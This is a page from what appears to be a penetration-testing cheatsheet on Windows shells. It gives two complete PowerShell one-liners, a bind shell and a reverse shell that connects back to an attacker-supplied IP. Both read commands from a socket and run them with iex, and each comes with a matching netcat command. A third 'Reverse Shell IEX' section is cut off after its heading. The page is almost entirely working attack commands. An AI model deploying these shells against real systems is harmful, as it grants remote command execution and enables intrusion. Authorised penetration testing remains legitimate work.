---
layout: default
parent: Windows
grand_parent: Pentest Cheatsheets
title: Windows Shells
nav-order: 1
---

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

powershell
==========

**Bind Shell**
--------------

_TARGET_
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<BIND_PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"  
```

_LOCAL_

```
nc <TARGET_IP> <BIND_PORT>

```

**Reverse Shell Single Line**
-----------------

_LOCAL_

nc -nlvp <REVERSE_PORT>

_TARGET_

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<MY_IP>',<REVERSE_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Reverse Shell IEX**

_LOCAL_
>
